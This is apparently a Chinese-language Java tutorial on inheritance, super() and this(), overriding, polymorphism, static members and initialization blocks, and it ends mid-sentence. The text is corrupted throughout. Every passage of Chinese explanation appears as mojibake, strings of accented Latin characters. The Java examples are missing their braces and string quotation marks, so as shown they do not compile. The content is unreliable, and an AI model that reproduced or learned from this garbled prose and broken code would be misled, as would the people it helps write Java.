private ä¿®é¥°,åªæœ‰ç±»æœ¬èº«å¯ä»¥è®¿é—®,ä¸å¯¹å¤–å…¬å¼€ ç»§æ‰¿ å­ç±»ç»§æ‰¿äº†æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œéç§æœ‰çš„å±æ€§å’Œæ–¹æ³•å¯ä»¥åœ¨å­ç±»ç›´æ¥è®¿é—®, ä½†æ˜¯ç§æœ‰å±æ€§å’Œæ–¹æ³•ä¸èƒ½åœ¨å­ç±»ç›´æ¥è®¿ é—®ï¼Œè¦é€šè¿‡çˆ¶ç±»æä¾›å…¬å…±çš„æ–¹æ³•å»è®¿é—® å­ç±»å¿…é¡»è°ƒç”¨çˆ¶ç±»çš„æ„é€ å™¨ï¼Œ å®Œæˆçˆ¶ç±»çš„åˆå§‹åŒ– å½“åˆ›å»ºå­ç±»å¯¹è±¡æ—¶ï¼Œä¸ç®¡ä½¿ç”¨å­ç±»çš„å“ªä¸ªæ„é€ å™¨ï¼Œé»˜è®¤æƒ…å†µä¸‹æ€»ä¼šå»è°ƒç”¨çˆ¶ç±»çš„æ— å‚æ„é€ å™¨ï¼Œå¦‚æœçˆ¶ç±»æ²¡æœ‰æä¾›æ— å‚æ„é€ å™¨ï¼Œåˆ™å¿…é¡»åœ¨å­ç±»çš„æ„é€ å™¨ä¸­ç”¨ super å»æŒ‡å®šä½¿ç”¨çˆ¶ç±»çš„å“ªä¸ªæ„é€ å™¨å®Œæˆå¯¹çˆ¶ç±»çš„åˆå§‹åŒ–å·¥ä½œï¼Œå¦åˆ™ï¼Œç¼–è¯‘ä¸ä¼šé€šè¿‡ å¦‚æœå¸Œæœ›æŒ‡å®šå»è°ƒç”¨çˆ¶ç±»çš„æŸä¸ªæ„é€ å™¨ï¼Œåˆ™æ˜¾å¼çš„è°ƒç”¨ä¸€ä¸‹ : super(å‚æ•°åˆ—è¡¨) super åœ¨ä½¿ç”¨æ—¶ï¼Œå¿…é¡»æ”¾åœ¨æ„é€ å™¨ç¬¬ä¸€è¡Œ(superåªèƒ½åœ¨æ„é€ å™¨ä¸­ä½¿ç”¨) super() å’Œ this() éƒ½åªèƒ½æ”¾åœ¨æ„é€ å™¨ç¬¬ä¸€è¡Œï¼Œå› æ­¤è¿™ä¸¤ä¸ªæ–¹æ³•ä¸èƒ½å…±å­˜åœ¨ä¸€ä¸ªæ„é€ å™¨ java æ‰€æœ‰ç±»éƒ½æ˜¯ Object ç±»çš„å­ç±», Object æ˜¯æ‰€æœ‰ç±»çš„åŸºç±». çˆ¶ç±»æ„é€ å™¨çš„è°ƒç”¨ä¸é™äºç›´æ¥çˆ¶ç±»ï¼å°†ä¸€ç›´å¾€ä¸Šè¿½æº¯ç›´åˆ° Object ç±»(é¡¶çº§çˆ¶ç±») å­ç±»æœ€å¤šåªèƒ½ç»§æ‰¿ä¸€ä¸ªçˆ¶ç±»(æŒ‡ç›´æ¥ç»§æ‰¿)ï¼Œå³ java ä¸­æ˜¯å•ç»§æ‰¿æœºåˆ¶ ä¸èƒ½æ»¥ç”¨ç»§æ‰¿ï¼Œå­ç±»å’Œçˆ¶ç±»ä¹‹é—´å¿…é¡»æ»¡è¶³ is-a çš„é€»è¾‘å…³ç³» è¿™é‡Œæ¥è§£é‡Šä¸€ä¸‹super()å’Œthis()ä¹‹é—´çš„åŒºåˆ«æ‰€åœ¨ super() è°ƒç”¨çˆ¶ç±»æ„é€ æ–¹æ³•ï¼šsuper()ç”¨äºåœ¨å­ç±»çš„æ„é€ æ–¹æ³•ä¸­è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•ã€‚è¿™æ ·åšæ˜¯ä¸ºäº†ç¡®ä¿çˆ¶ç±»çš„æ„é€ æ–¹æ³•åœ¨å­ç±»çš„æ„é€ æ–¹æ³•ä¹‹å‰æ‰§è¡Œã€‚ å¿…é¡»æ˜¯æ„é€ æ–¹æ³•çš„ç¬¬ä¸€è¡Œï¼šsuper()è°ƒç”¨å¿…é¡»æ˜¯å­ç±»æ„é€ æ–¹æ³•ä¸­çš„ç¬¬ä¸€æ¡è¯­å¥ã€‚å¦‚æœæ²¡æœ‰æ˜¾å¼åœ°è°ƒç”¨super()ï¼Œç¼–è¯‘å™¨ä¼šåœ¨æ²¡æœ‰å‚æ•°çš„æƒ…å†µä¸‹éšå¼åœ°è°ƒç”¨çˆ¶ç±»çš„æ— å‚æ„é€ æ–¹æ³•ã€‚ å‚æ•°ä¼ é€’ï¼šå¯ä»¥ä½¿ç”¨å‚æ•°å°†å€¼ä¼ é€’ç»™çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œä¾‹å¦‚super(param1, param2)ã€‚ æ¥ä¸ªä¾‹å­å¦‚ä¸‹ï¼š class Parent Parent() System.out.println(Parent Constructor); class Child extends Parent Child() super(); System.out.println(Child Constructor); public class Test public static void main(String[] args) Child child = new Child(); this() è°ƒç”¨å½“å‰ç±»çš„æ„é€ æ–¹æ³•ï¼šthis()ç”¨äºè°ƒç”¨å½“å‰ç±»çš„å¦ä¸€ä¸ªæ„é€ æ–¹æ³•ã€‚è¿™é€šå¸¸ç”¨äºæ„é€ æ–¹æ³•ä¹‹é—´çš„é‡ç”¨ä»£ç ã€‚ å¿…é¡»æ˜¯æ„é€ æ–¹æ³•çš„ç¬¬ä¸€è¡Œï¼šä¸super()ç±»ä¼¼ï¼Œthis()è°ƒç”¨ä¹Ÿå¿…é¡»æ˜¯æ„é€ æ–¹æ³•ä¸­çš„ç¬¬ä¸€æ¡è¯­å¥ã€‚ å‚æ•°ä¼ é€’ï¼šå¯ä»¥ä½¿ç”¨å‚æ•°å°†å€¼ä¼ é€’ç»™å½“å‰ç±»çš„å¦ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œä¾‹å¦‚this(param1, param2)ã€‚ class Example Example() this(Hello); System.out.println(Default Constructor); Example(String msg) System.out.println(Parameterized Constructor: + msg); public class Test public static void main(String[] args) Example example = new Example(); superå…³é”®å­—super ä»£è¡¨çˆ¶ç±»çš„å¼•ç”¨ï¼Œç”¨äºè®¿é—®çˆ¶ç±»çš„å±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨ superå…³é”®å­—ä¸ä¼šè®¿é—®å½“å‰ç±»ï¼ˆæœ¬ç±»ï¼‰çš„æˆå‘˜å’Œæ–¹æ³• è®¿é—®çˆ¶ç±»çš„æˆå‘˜å˜é‡ class Parent int x = 10;class Child extends Parent int x = 20; void display() System.out.println(Child x: + x); System.out.println(Parent x: + super.x); // è®¿é—®çˆ¶ç±»çš„æˆå‘˜å˜é‡ public class Main public static void main(String[] args) Child child = new Child(); child.display(); è®¿é—®çˆ¶ç±»çš„æ–¹æ³• class Parent void display() System.out.println(Display from Parent); class Child extends Parent void display() System.out.println(Display from Child); super.display(); // è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³• public class Main public static void main(String[] args) Child child = new Child(); child.display(); superå…³é”®å­—æ‰€å¸¦æ¥çš„ä¾¿åˆ© æ–¹æ³•è¦†å†™æ–¹æ³•è¦†å†™å°±æ˜¯å­ç±»ä¸­æœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œå’Œçˆ¶ç±»çš„æŸä¸ªæ–¹æ³•çš„åç§°ã€è¿”å›ç±»å‹ã€å‚æ•°ä¸€æ ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¯´å­ç±»çš„è¿™ä¸ªæ–¹æ³•è¦†ç›–äº†çˆ¶ç±»çš„æ–¹æ³• ä»¥ä¸‹æ˜¯å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ï¼š æ–¹æ³•ç­¾åï¼š è¦†å†™çš„æ–¹æ³•å¿…é¡»å…·æœ‰ä¸çˆ¶ç±»æ–¹æ³•ç›¸åŒçš„æ–¹æ³•ç­¾åï¼ŒåŒ…æ‹¬æ–¹æ³•åå’Œå‚æ•°åˆ—è¡¨ã€‚ è®¿é—®ä¿®é¥°ç¬¦ï¼š å­ç±»æ–¹æ³•çš„è®¿é—®ä¿®é¥°ç¬¦ä¸èƒ½æ¯”çˆ¶ç±»æ–¹æ³•çš„æ›´ä¸¥æ ¼ã€‚ä¾‹å¦‚ï¼Œå¦‚æœçˆ¶ç±»æ–¹æ³•æ˜¯publicï¼Œå­ç±»æ–¹æ³•ä¹Ÿå¿…é¡»æ˜¯publicã€‚ è¿”å›ç±»å‹ï¼š è¦†å†™æ–¹æ³•çš„è¿”å›ç±»å‹å¯ä»¥æ˜¯çˆ¶ç±»æ–¹æ³•è¿”å›ç±»å‹çš„å­ç±»å‹ï¼ˆåå˜è¿”å›ç±»å‹ï¼‰ï¼Œä½†ä¸èƒ½æ˜¯å…¶ä»–ä¸ç›¸å…³çš„ç±»å‹ã€‚ï¼ˆçˆ¶ç±» è¿”å›ç±»å‹æ˜¯ Object ,å­ç±»æ–¹æ³•è¿”å›ç±»å‹æ˜¯ Stringï¼‰ å¼‚å¸¸å¤„ç†ï¼š å­ç±»æ–¹æ³•æŠ›å‡ºçš„å¼‚å¸¸ä¸èƒ½æ¯”çˆ¶ç±»æ–¹æ³•æŠ›å‡ºçš„å¼‚å¸¸æ›´å¹¿æ³›ã€‚ä¾‹å¦‚ï¼Œå¦‚æœçˆ¶ç±»æ–¹æ³•æŠ›å‡ºä¸€ä¸ªIOExceptionï¼Œå­ç±»æ–¹æ³•åªèƒ½æŠ›å‡ºIOExceptionæˆ–å…¶å­ç±»çš„å¼‚å¸¸ï¼Œä¸èƒ½æŠ›å‡ºExceptionæˆ–å…¶ä»–æ›´æ³›çš„å¼‚å¸¸ã€‚ ä½¿ç”¨@Overrideæ³¨è§£ï¼š åœ¨è¦†å†™çš„æ–¹æ³•ä¸ŠåŠ ä¸Š@Overrideæ³¨è§£æœ‰åŠ©äºç¼–è¯‘å™¨æ£€æŸ¥æ˜¯å¦æ­£ç¡®åœ°è¦†å†™äº†çˆ¶ç±»çš„æ–¹æ³•ã€‚å¦‚æœæ²¡æœ‰æ­£ç¡®è¦†å†™ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ã€‚ è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼š åœ¨å­ç±»æ–¹æ³•ä¸­ï¼Œå¯ä»¥ä½¿ç”¨superå…³é”®å­—è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼šsuper.methodName()ã€‚ é™æ€æ–¹æ³•ä¸èƒ½è¦†å†™ï¼š é™æ€æ–¹æ³•ä¸èƒ½è¢«è¦†å†™ï¼ˆOverrideï¼‰ï¼Œè€Œæ˜¯è¢«éšè—ï¼ˆHideï¼‰ã€‚å¦‚æœå­ç±»å®šä¹‰äº†ä¸€ä¸ªä¸çˆ¶ç±»é™æ€æ–¹æ³•ç›¸åŒçš„æ–¹æ³•ï¼Œè¿™åªæ˜¯éšè—äº†çˆ¶ç±»çš„æ–¹æ³•ï¼Œå¹¶ä¸æ˜¯è¦†å†™ã€‚ finalæ–¹æ³•ä¸èƒ½è¦†å†™ï¼š å¦‚æœçˆ¶ç±»çš„æ–¹æ³•è¢«å£°æ˜ä¸ºfinalï¼Œé‚£ä¹ˆå­ç±»ä¸èƒ½è¦†å†™è¿™ä¸ªæ–¹æ³•ã€‚ æ„é€ æ–¹æ³•ä¸èƒ½è¦†å†™ï¼š æ„é€ æ–¹æ³•ä¸èƒ½è¢«ç»§æ‰¿æˆ–è¦†å†™ã€‚ class Animal public void makeSound() System.out.println(Animal makes a sound); public void eat() throws IOException System.out.println(Animal eats); class Dog extends Animal @Override public void makeSound() System.out.println(Dog barks); @Override public void eat() throws IOException System.out.println(Dog eats); public class Main public static void main(String[] args) throws IOException Animal myDog = new Dog(); myDog.makeSound(); // è¾“å‡ºï¼šDog barks myDog.eat(); // è¾“å‡ºï¼šDog eats é‡å†™ä¸è¦†å†™ä¹‹é—´çš„åŒºåˆ« ä¸‹é¢æ¥ä¸€ä¸ªå®ä¾‹ï¼š ç¼–å†™ä¸€ä¸ª Person ç±»ï¼ŒåŒ…æ‹¬å±æ€§privateï¼ˆnameã€ageï¼‰ï¼Œæ„é€ å™¨ã€æ–¹æ³• say(è¿”å›è‡ªæˆ‘ä»‹ç»çš„å­—ç¬¦ä¸²ï¼‰ ç¼–å†™ä¸€ä¸ª Student ç±»ï¼Œç»§æ‰¿ Person ç±»ï¼Œå¢åŠ  idã€score å±æ€§privateï¼Œä»¥åŠæ„é€ å™¨ï¼Œå®šä¹‰ say æ–¹æ³•(è¿”å›è‡ªæˆ‘ä»‹ç»çš„ä¿¡æ¯) åœ¨ main ä¸­,åˆ†åˆ«åˆ›å»º Person å’Œ Student å¯¹è±¡ï¼Œè°ƒç”¨ say æ–¹æ³•è¾“å‡ºè‡ªæˆ‘ä»‹ç» Person.java package show;public class Person private String name; private int age; public Person(String name, int age) this.name = name; this.age = age; public String say() return name= + name + age= + age; Student.java package show;public class Student extends Person private int id; private double score; public Student(String name, int age, int id, double score) super(name, age); this.id = id; this.score = score; public String say() return super.say() + id= + id + score= + score;//super()æ–¹æ³•ï¼Œä»£ç å¤ç”¨ Test.java import show.*;public class Test public static void main(String[] args) //åœ¨ main ä¸­,åˆ†åˆ«åˆ›å»º Person å’Œ Student å¯¹è±¡ï¼Œè°ƒç”¨ say æ–¹æ³•è¾“å‡ºè‡ªæˆ‘ä»‹ç» Person jack = new Person(jack, 10); System.out.println(jack.say()); Student smith = new Student(smith, 20, 123456, 99.8); System.out.println(smith.say()); å¤šæ€æ–¹æ³•çš„å¤šæ€æ–¹æ³•çš„é‡å†™å’Œé‡è½½å°±ä½“ç°äº†å¤šæ€ å¯¹è±¡çš„å¤šæ€ ç±»Dog,Catéƒ½æ˜¯ç±»Animalçš„å­ç±»ï¼Œå·²ç»å®šä¹‰è¿‡äº† public class PolyObject public static void main(String[] args) //ä½“éªŒå¯¹è±¡å¤šæ€ç‰¹ç‚¹\t//animal ç¼–è¯‘ç±»å‹å°±æ˜¯ Animal , è¿è¡Œç±»å‹ Dog\tAnimal animal = new Dog();\t//å› ä¸ºè¿è¡Œæ—¶ , æ‰§è¡Œåˆ°æ”¹è¡Œæ—¶ï¼Œanimal è¿è¡Œç±»å‹æ˜¯ Dog,æ‰€ä»¥ cry å°±æ˜¯ Dog çš„ cry\tanimal.cry(); //å°ç‹—æ±ªæ±ªå«\t//animal ç¼–è¯‘ç±»å‹ Animal,è¿è¡Œç±»å‹å°±æ˜¯ Cat\tanimal = new Cat();\tanimal.cry(); //å°çŒ«å–µå–µå« å› æ­¤ï¼Œåˆ©ç”¨å¤šæ€æˆ‘ä»¬å°±å¯ä»¥å®Œæˆä¸‹é¢è¿™é“ç¼–ç¨‹é¢˜ç›® å¯¹äºè¿™é“é¢˜ï¼Œå½“æˆ‘ä»¬å†™å®Œå„ç§çš„å­ç±»ä¹‹åï¼Œåœ¨ä¸Šé¢ç±»Masterä¸­çš„æ–¹æ³•å°±åªè¦å†™ä¸‹é¢è¿™ä¸ª å¤šæ€çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚å¤šæ€çš„å‰ææ˜¯ï¼šä¸¤ä¸ªå¯¹è±¡(ç±»)å­˜åœ¨ç»§æ‰¿å…³ç³» ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š public class PolyDetail public static void main(String[] args) //å‘ä¸Šè½¬å‹: çˆ¶ç±»çš„å¼•ç”¨æŒ‡å‘äº†å­ç±»çš„å¯¹è±¡\t//è¯­æ³•ï¼šçˆ¶ç±»ç±»å‹å¼•ç”¨å = new å­ç±»ç±»å‹();\tAnimal animal = new Cat();\tObject obj = new Cat();//å¯ä»¥å—? å¯ä»¥ Object ä¹Ÿæ˜¯ Cat çš„çˆ¶ç±»\t//å‘ä¸Šè½¬å‹è°ƒç”¨æ–¹æ³•çš„è§„åˆ™å¦‚ä¸‹:\t//(1)å¯ä»¥è°ƒç”¨çˆ¶ç±»ä¸­çš„æ‰€æœ‰æˆå‘˜(éœ€éµå®ˆè®¿é—®æƒé™)\t//(2)ä½†æ˜¯ä¸èƒ½è°ƒç”¨å­ç±»çš„ç‰¹æœ‰çš„æˆå‘˜\t//(#)å› ä¸ºåœ¨ç¼–è¯‘é˜¶æ®µï¼Œèƒ½è°ƒç”¨å“ªäº›æˆå‘˜,æ˜¯ç”±ç¼–è¯‘ç±»å‹æ¥å†³å®šçš„\t//animal.catchMouse();é”™è¯¯\t//(4)æœ€ç»ˆè¿è¡Œæ•ˆæœçœ‹å­ç±»(è¿è¡Œç±»å‹)çš„å…·ä½“å®ç°, å³è°ƒç”¨æ–¹æ³•æ—¶ï¼ŒæŒ‰ç…§ä»å­ç±»(è¿è¡Œç±»å‹)å¼€å§‹æŸ¥æ‰¾æ–¹æ³•\t//ï¼Œç„¶åè°ƒç”¨ï¼Œè§„åˆ™æˆ‘å‰é¢æˆ‘ä»¬è®²çš„æ–¹æ³•è°ƒç”¨è§„åˆ™ä¸€è‡´ã€‚\tanimal.eat();//çŒ«åƒé±¼.. animal.run();//è·‘\tanimal.show();//hello,ä½ å¥½\tanimal.sleep();//ç¡\t//å¸Œæœ›å¯ä»¥è°ƒç”¨ Cat çš„ catchMouse æ–¹æ³•\t//å¤šæ€çš„å‘ä¸‹è½¬å‹\t//(1)è¯­æ³•ï¼šå­ç±»ç±»å‹ å¼•ç”¨å =ï¼ˆå­ç±»ç±»å‹ï¼‰çˆ¶ç±»å¼•ç”¨;\t//é—®ä¸€ä¸ªé—®é¢˜? cat çš„ç¼–è¯‘ç±»å‹ Cat,è¿è¡Œç±»å‹æ˜¯ Cat\tCat cat = (Cat) animal;\tcat.catchMouse();//çŒ«æŠ“è€é¼ \t//(2)è¦æ±‚çˆ¶ç±»çš„å¼•ç”¨å¿…é¡»æŒ‡å‘çš„æ˜¯å½“å‰ç›®æ ‡ç±»å‹çš„å¯¹è±¡\tDog dog = (Dog) animal; //å¯ä»¥å—ï¼Ÿ\tSystem.out.println(ok~~); å±æ€§æ²¡æœ‰é‡å†™ä¸€è¯´ï¼Œå±æ€§çš„å€¼è¦çœ‹ç¼–è¯‘ç±»å‹ public class PolyDetail02 public static void main(String[] args) //å±æ€§æ²¡æœ‰é‡å†™ä¹‹è¯´ï¼å±æ€§çš„å€¼çœ‹ç¼–è¯‘ç±»å‹Base base = new Sub();//å‘ä¸Šè½¬å‹System.out.println(base.count);// ï¼Ÿ çœ‹ç¼–è¯‘ç±»å‹ 10Sub sub = new Sub();System.out.println(sub.count);//? 20class Base //çˆ¶ç±»int count = 10;//å±æ€§class Sub extends Base //å­ç±»int count = 20;//å±æ€§ instanceOf æ¯”è¾ƒæ“ä½œç¬¦ï¼Œç”¨äºåˆ¤æ–­å¯¹è±¡çš„è¿è¡Œç±»å‹æ˜¯å¦ä¸º XX ç±»å‹æˆ– XX ç±»å‹çš„å­ç±»å‹ System.out.println(bb instanceof BB); å¤šæ€çš„åº”ç”¨ï¼ˆ1ï¼‰å¤šæ€æ•°ç»„ï¼šæ•°ç»„çš„å®šä¹‰ç±»å‹ä¸ºçˆ¶ç±»ç±»å‹ï¼Œé‡Œé¢ä¿å­˜çš„å®é™…å…ƒç´ ç±»å‹ä¸ºå­ç±»ç±»å‹ åº”ç”¨å®ä¾‹:ç°æœ‰ä¸€ä¸ªç»§æ‰¿ç»“æ„å¦‚ä¸‹ï¼šè¦æ±‚åˆ›å»º 1 ä¸ª Person å¯¹è±¡ã€2 ä¸ª Student å¯¹è±¡å’Œ 2 ä¸ª Teacher å¯¹è±¡, ç»Ÿä¸€æ”¾åœ¨æ•°ç»„ ä¸­ï¼Œå¹¶è°ƒç”¨æ¯ä¸ªå¯¹è±¡ say æ–¹æ³•. åº”ç”¨å®ä¾‹å‡çº§ï¼šå¦‚ä½•è°ƒç”¨å­ç±»ç‰¹æœ‰çš„æ–¹æ³•ï¼Œæ¯”å¦‚ Teacher æœ‰ä¸€ä¸ª teach , Student æœ‰ä¸€ä¸ª study æ€ä¹ˆè°ƒç”¨ï¼Ÿ åœ¨å·²ç»å†™å®ŒPerson,Student,Teacherç±»åçš„æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š import show.*;public class Test public static void main(String[] args) //åº”ç”¨å®ä¾‹:ç°æœ‰ä¸€ä¸ªç»§æ‰¿ç»“æ„å¦‚ä¸‹ï¼šè¦æ±‚åˆ›å»º 1 ä¸ª Person å¯¹è±¡ã€ // 2 ä¸ª Student å¯¹è±¡å’Œ 2 ä¸ª Teacher å¯¹è±¡, ç»Ÿä¸€æ”¾åœ¨æ•°ç»„ä¸­ï¼Œå¹¶è°ƒç”¨æ¯ä¸ªå¯¹è±¡ say æ–¹æ³• Person[] persons = new Person[5]; persons[0] = new Person(jack, 20); persons[1] = new Student(mary, 18, 100); persons[2] = new Student(smith, 19, 30.1); persons[3] = new Teacher(scott, 30, 20000); persons[4] = new Teacher(king, 50, 25000); //å¾ªç¯éå†å¤šæ€æ•°ç»„ï¼Œè°ƒç”¨ say for (int i = 0; i persons.length; i++) //person[i] ç¼–è¯‘ç±»å‹æ˜¯ Person ,è¿è¡Œç±»å‹æ˜¯æ˜¯æ ¹æ®å®é™…æƒ…å†µæœ‰ JVM æ¥åˆ¤æ–­ System.out.println(persons[i].say());//åŠ¨æ€ç»‘å®šæœºåˆ¶ //è¿™é‡Œä½¿ç”¨ ç±»å‹åˆ¤æ–­ + å‘ä¸‹è½¬å‹. if(persons[i] instanceof Student) //åˆ¤æ–­ person[i] çš„è¿è¡Œç±»å‹æ˜¯ä¸æ˜¯Student Student student = (Student)persons[i];//å‘ä¸‹è½¬å‹ student.study(); //ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€å¥è¯ ((Student)persons[i]).study(); else if(persons[i] instanceof Teacher) Teacher teacher = (Teacher) persons[i]; teacher.teach(); ï¼ˆ2ï¼‰å¤šæ€å‚æ•° æ–¹æ³•å®šä¹‰çš„å½¢å‚ç±»å‹ä¸ºçˆ¶ç±»ç±»å‹ï¼Œå®å‚ç±»å‹å¯ä»¥ä¸ºå­ç±»ç±»å‹ å®ä¾‹å°±æ¯”å¦‚å‰é¢çš„ä¸»äººå–‚é£ŸåŠ¨ç‰© é¢å‘å¯¹è±¡-é«˜çº§ç±»å˜é‡å’Œç±»æ–¹æ³•ç±»å˜é‡åœ¨ Java ä¸­ï¼Œç±»å˜é‡ï¼ˆä¹Ÿç§°ä¸ºé™æ€å˜é‡ï¼Œstatic variableï¼‰æ˜¯å±äºæ•´ä¸ªç±»è€Œä¸æ˜¯æŸä¸ªç‰¹å®šå¯¹è±¡çš„å˜é‡ã€‚ç±»å˜é‡åœ¨ç±»åŠ è½½æ—¶åˆå§‹åŒ–ï¼Œå¹¶ä¸”åœ¨ç±»çš„æ‰€æœ‰å®ä¾‹ä¹‹é—´å…±äº«ã€‚å®ƒä»¬ä½¿ç”¨å…³é”®å­— static æ¥å£°æ˜ å®šä¹‰ç±»å˜é‡ï¼šè®¿é—®ä¿®é¥°ç¬¦ static æ•°æ®ç±»å‹ å˜é‡å; è®¿é—®ç±»å˜é‡ï¼šç±»å/å¯¹è±¡å.ç±»å˜é‡å; æ¥ä¸ªä¾‹å­ç®€å•äº†è§£ä¸€ä¸‹ public class New public static void main(String[] args) //å®šä¹‰ä¸€ä¸ªå˜é‡ count, ç»Ÿè®¡æœ‰å¤šå°‘å°å­©åŠ å…¥äº†æ¸¸æˆ int count = 0; Child child1 = new Child(ç™½éª¨ç²¾); child1.join();//count++; child1.count++; Child child2 = new Child(ç‹ç‹¸ç²¾); child2.join();//count++; child2.count++; Child child3 = new Child(è€é¼ ç²¾); child3.join();//count++; child3.count++;//===========//ç±»å˜é‡ï¼Œå¯ä»¥é€šè¿‡ç±»åæ¥è®¿é—® System.out.println(å…±æœ‰ + Child.count + å°å­©åŠ å…¥äº†æ¸¸æˆ...); System.out.println(child1.count= + child1.count);//3 System.out.println(child2.count= + child2.count);//3 System.out.println(child3.count= + child3.count);//3 class Child //ç±» private String name; //å®šä¹‰ä¸€ä¸ªå˜é‡ count ,æ˜¯ä¸€ä¸ªç±»å˜é‡(é™æ€å˜é‡) static é™æ€//è¯¥å˜é‡æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯ä¼šè¢« Child ç±»çš„æ‰€æœ‰çš„å¯¹è±¡å®ä¾‹å…±äº« public static int count = 0; public Child(String name) this.name = name; public void join() System.out.println(name + åŠ å…¥äº†æ¸¸æˆ..); æ³¨æ„ ç±»å˜é‡åœ¨ç±»åŠ è½½çš„æ—¶å€™å°±åˆå§‹åŒ–äº†ï¼Œä¹Ÿå°±æ˜¯è¯´å³ä½¿ä½ æ²¡æœ‰åˆ›å»ºå¯¹è±¡ï¼Œåªè¦ç±»åŠ è½½äº†ï¼Œå°±å¯ä»¥ä½¿ç”¨ç±»å˜é‡äº† å½“ä¸€ä¸ªç±»çš„æ‰€æœ‰å¯¹è±¡éƒ½å…±äº«ä¸€ä¸ªå˜é‡çš„æ—¶å€™ï¼Œè€ƒè™‘ä½¿ç”¨ç±»å˜é‡ï¼šæ¯”å¦‚å®šä¹‰å­¦ç”Ÿç±»ï¼Œç»Ÿè®¡æ‰€æœ‰å­¦ç”Ÿä¸€å…±äº¤äº†å¤šå°‘é’± Student(name,static fee) ç±»æ–¹æ³•ç±»æ–¹æ³•å°±æ˜¯é™æ€æ–¹æ³•ï¼Œå½¢å¼ä¸ºï¼šè®¿é—®ä¿®é¥°ç¬¦ static æ•°æ®è¿”å›ç±»å‹ æ–¹æ³•å() ä½¿ç”¨ï¼šç±»å/å¯¹è±¡å.ç±»æ–¹æ³•å æ¥ä¸ªä¾‹å­ç†è§£ä¸€ä¸‹ public class New public static void main(String[] args) //åˆ›å»º 2 ä¸ªå­¦ç”Ÿå¯¹è±¡ï¼Œäº¤å­¦è´¹ Stu tom = new Stu(tom);//tom.payFee(100); Stu.payFee(100);//å¯¹ä¸å¯¹?å¯¹ Stu mary = new Stu(mary);//mary.payFee(200); Stu.payFee(200);//å¯¹//è¾“å‡ºå½“å‰æ”¶åˆ°çš„æ€»å­¦è´¹ Stu.showFee();//300//å¦‚æœæˆ‘ä»¬å¸Œæœ›ä¸åˆ›å»ºå®ä¾‹ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨æŸä¸ªæ–¹æ³•(å³å½“åšå·¥å…·æ¥ä½¿ç”¨)//è¿™æ—¶ï¼ŒæŠŠæ–¹æ³•åšæˆé™æ€æ–¹æ³•æ—¶éå¸¸åˆé€‚ System.out.println(9 å¼€å¹³æ–¹çš„ç»“æœæ˜¯= + Math.sqrt(9)); System.out.println(MyTools.calSum(10, 30)); //å¼€å‘è‡ªå·±çš„å·¥å…·ç±»æ—¶ï¼Œå¯ä»¥å°†æ–¹æ³•åšæˆé™æ€çš„ï¼Œæ–¹ä¾¿è°ƒç”¨class MyTools //æ±‚å‡ºä¸¤ä¸ªæ•°çš„å’Œ public static double calSum(double n1, double n2) return n1 + n2; //å¯ä»¥å†™å‡ºå¾ˆå¤šè¿™æ ·çš„å·¥å…·æ–¹æ³•... class Stu private String name;//æ™®é€šæˆå‘˜ //å®šä¹‰ä¸€ä¸ªé™æ€å˜é‡ï¼Œæ¥ç´¯ç§¯å­¦ç”Ÿçš„å­¦è´¹ private static double fee = 0; public Stu(String name) this.name = name; //è¯´æ˜//1. å½“æ–¹æ³•ä½¿ç”¨äº† static ä¿®é¥°åï¼Œè¯¥æ–¹æ³•å°±æ˜¯é™æ€æ–¹æ³•//2. é™æ€æ–¹æ³•å°±å¯ä»¥è®¿é—®é™æ€å±æ€§/å˜é‡ public static void payFee(double fee) Stu.fee += fee;//ç´¯ç§¯åˆ° public static void showFee() System.out.println(æ€»å­¦è´¹æœ‰: + Stu.fee); æ³¨æ„ï¼šé™æ€æ–¹æ³•åªèƒ½è®¿é—®é™æ€æˆå‘˜ï¼Œéé™æ€çš„æ–¹æ³•å¯ä»¥è®¿é—®é™æ€æˆå‘˜å’Œéé™æ€æˆå‘˜ ä»£ç å—ä»£ç åŒ–å—åˆç§°ä¸ºåˆå§‹åŒ–å—ï¼Œå±äºç±»ä¸­çš„æˆå‘˜ï¼Œç±»ä¼¼äºæ–¹æ³•ï¼Œä½†å’Œæ–¹æ³•ä¸ä¸€æ ·çš„æ˜¯å®ƒæ²¡æœ‰æ–¹æ³•åï¼Œæ²¡æœ‰è¿”å›ï¼Œæ²¡æœ‰å‚æ•°ï¼Œåªæœ‰æ–¹æ³•ä½“ï¼Œè€Œä¸”ä¸ç”¨é€šè¿‡å¯¹è±¡æˆ–ç±»æ˜¾å¼è°ƒç”¨ï¼Œè€Œæ˜¯åŠ è½½ç±»æ—¶ï¼Œæˆ–åˆ›å»ºå¯¹è±¡æ—¶éšå¼è°ƒç”¨ è¯­æ³•ï¼š[ä¿®é¥°ç¬¦]ä»£ç ;ï¼Œè¦æ³¨æ„ä¿®é¥°ç¬¦å¯é€‰ï¼Œè¦å†™çš„è¯ä¹Ÿåªèƒ½å†™static ä»£ç å—ç›¸å½“äºå¦ä¸€ç§å½¢å¼çš„æ„é€ å™¨ï¼Œå¯ä»¥è¿›è¡Œåˆå§‹åŒ–æ“ä½œï¼Œå¦‚æœè¯´å¤šä¸ªæ„é€ å™¨ä¸­éƒ½æœ‰é‡å¤è¯­å¥æ—¶ï¼Œå¯ä»¥æŠ½å–åˆ°ä»£ç å—ä¸­ï¼Œæé«˜ä»£ç é‡ç”¨æ€§ ä¸¾ä¸ªä¾‹å­å¦‚ä¸‹ï¼š class Movie private String name;private double price;private String director;//3 ä¸ªæ„é€ å™¨-ã€‹é‡è½½//(1) ä¸‹é¢çš„ä¸‰ä¸ªæ„é€ 